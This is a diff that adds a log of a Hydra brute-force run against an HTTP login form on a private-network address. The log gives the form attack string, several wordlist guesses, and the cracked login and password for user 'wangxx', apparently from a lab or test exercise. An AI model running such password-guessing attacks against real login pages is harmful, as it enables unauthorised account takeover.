@@ -1,0 +1,13 @@
+Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-09-09 11:46:28
+[DATA] max 4 tasks per 1 server, overall 4 tasks, 2798999 login tries (l:1/p:2798999), ~699750 tries per task
+[DATA] attacking http-post-form://192.168.100.101:80/dologin.html:httpd_username=^USER^&httpd_password=^PASS^:Congratulations
+[ATTEMPT] target 192.168.100.101 - login "wangxx" - pass "password" - 1 of 2798999 [child 0] (0/0)
+[ATTEMPT] target 192.168.100.101 - login "wangxx" - pass "iloveyou" - 2 of 2798999 [child 1] (0/0)
+[ATTEMPT] target 192.168.100.101 - login "wangxx" - pass "princess" - 3 of 2798999 [child 2] (0/0)
+[ATTEMPT] target 192.168.100.101 - login "wangxx" - pass "12345678" - 4 of 2798999 [child 3] (0/0)
+[80][http-post-form] host: 192.168.100.101   login: wangxx   password: princess
+[STATUS] attack finished for 192.168.100.101 (valid pair found)
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-09-09 11:46:30
